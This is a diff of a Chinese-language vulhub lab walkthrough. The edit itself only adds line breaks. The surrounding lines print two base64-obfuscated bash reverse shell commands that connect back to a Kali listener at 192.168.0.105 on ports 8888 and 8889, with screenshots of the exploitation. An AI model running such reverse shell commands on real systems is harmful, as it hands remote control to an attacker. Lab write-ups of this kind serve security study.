@@ -34,7 +34,7 @@ vulhub<br>
 <br>准备反弹shell
 <br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA1Lzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i} || (Base64)
 <br>编码内容→bash -i >& /dev/tcp/192.168.0.105/8888 0>&1
-<br>kali监听
+<br>kali监听<br>
 ![image](https://user-images.githubusercontent.com/73600604/218240588-a377065e-c4fc-403c-950d-0e688b7e446c.png)
 <br>漏洞利用
 ![image](https://user-images.githubusercontent.com/73600604/218240553-009588c6-be8f-4bbd-9fe8-d3e8cc001795.png)
@@ -46,7 +46,7 @@ vulhub<br>
 <br>同样准备反弹shell
 <br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA1Lzg4ODkgMD4mMQ==}|{base64,-d}|{bash,-i} || (Base64)
 <br>编码内容→bash -i >& /dev/tcp/192.168.0.105/8889 0>&1
-<br>kali监听
+<br>kali监听<br>
 ![image](https://user-images.githubusercontent.com/73600604/218240722-f36a7ac5-b2c3-4043-9b9e-54be43052799.png)
 <br>漏洞利用
 ![image](https://user-images.githubusercontent.com/73600604/218240756-52bb0691-bcbe-4057-b502-716d86aa2a1d.png)
